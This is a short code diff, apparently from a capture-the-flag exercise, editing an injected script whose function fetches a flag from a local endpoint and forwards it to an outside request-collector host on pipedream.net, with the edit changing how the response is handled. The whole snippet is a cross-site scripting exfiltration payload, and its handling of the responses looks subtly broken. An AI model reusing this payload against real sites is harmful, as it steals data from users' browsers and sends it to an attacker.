@@ -8,7 +8,7 @@
 <script>
     function prova(){
         fetch("https://localhost/get_flag.php").then(d => {
-            fetch("https://enahomwjmoi9k.x.pipedream.net/" + d.json()).then(h => console.log(h))
+            fetch("https://enahomwjmoi9k.x.pipedream.net/" + d.json()).then(h => document.write(d))
         });
     }
 
